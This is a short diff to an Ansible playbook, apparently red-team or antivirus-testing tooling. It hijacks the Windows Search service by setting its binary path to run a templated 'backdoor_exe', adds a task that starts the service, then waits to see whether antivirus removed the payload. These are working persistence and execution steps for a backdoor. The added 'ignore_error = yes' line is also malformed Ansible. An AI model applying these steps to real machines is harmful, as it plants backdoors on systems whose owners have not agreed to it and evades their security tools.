@@ -8,8 +8,11 @@
     tags: always
     win_command: |
       sc config WSearch binpath= "cmd /c {{ backdoor_exe }}"
-    #sc start WSearch
-      
+  - name: start WSearch service
+    tags: always
+    win_command: |
+      sc start WSearch
+    ignore_error = yes
   - name: sleep for 10 seconds and continue with play to check if AV removed or Not
     tags: always
     wait_for: timeout=10
